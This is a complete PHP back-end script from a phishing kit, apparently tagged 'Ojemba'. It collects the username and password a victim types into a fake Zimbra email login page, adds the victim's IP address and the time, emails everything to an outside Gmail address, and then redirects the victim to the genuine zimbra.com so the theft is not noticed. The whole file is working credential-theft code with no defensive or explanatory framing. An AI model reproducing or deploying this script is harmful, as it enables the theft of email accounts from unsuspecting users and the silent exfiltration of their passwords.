<?
$date = gmdate("Y/m/d | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "============xX Ojemba Xx======\n";
$message .= "Zimbra Email:    ".$_POST['username']."\n";
$message .= "Password:        ".$_POST['password']."\n";
$message .= "IP : ".$_SERVER['REMOTE_ADDR']." | Time Sent : ".date("m/d/Y g:i:a")."\n";
$message .= "==================================================\n";

$send="belchermark40@gmail.com";
$subject = "Login Zimbra";
$headers = "From: Ojemba<noreply>";
@mail($send,$subject,$message,$from);
@header("Location: https://www.zimbra.com");